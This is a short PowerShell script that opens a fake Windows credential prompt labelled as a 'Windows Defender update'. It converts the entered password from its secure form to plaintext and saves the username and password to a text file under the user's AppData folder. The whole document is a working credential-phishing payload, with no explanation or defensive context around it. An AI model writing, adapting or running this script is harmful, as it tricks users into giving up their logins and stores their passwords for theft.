$c = Get-Credential -Message "Insert your credentials for Windows Defender update."
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($c.Password)
$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)

$path = $env:APPDATA+'\\shaula\\cred.txt'
$mystring = 'User: '+$c.UserName +' # Pass: '+ $UnsecurePassword

$Utf8NoBomEncoding = New-Object System.Text.UTF8Encoding $False
[System.IO.File]::WriteAllLines($path, $mystring , $Utf8NoBomEncoding)
